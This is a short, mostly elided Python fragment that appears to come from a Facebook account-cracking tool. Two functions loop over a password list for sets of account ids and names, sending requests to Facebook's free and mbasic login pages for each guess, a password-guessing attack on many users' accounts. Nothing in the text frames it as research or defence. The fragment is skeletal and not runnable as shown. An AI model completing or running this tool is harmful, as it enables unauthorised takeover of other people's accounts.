...
def ffb(ids,names,passlist):
        ...
        try:
                ...
                for fikr in passlist:
                        ...
                        getlog = session.get(f'https://free.facebook.com/?paipv=0&eav=AfaIEJvJrlBUEEjMF372H6KLkhULy4ypXd67nWM_nQbqvR3Pp0aK3GeBlH_4L9yuk5w&_rdr')
...
def ffb3(ids,names,passlist):
        ...
        try:
                ...
                for fikr in passlist:
                        ...
                        getlog = session.get(f'https://mbasic.facebook.com/login/?email=10002993245455&li=UgAKZDG6GQk8Z_Zm_tsNs_CH&e=1348131&shbl=1&refsrc=deprecated&_rdr')
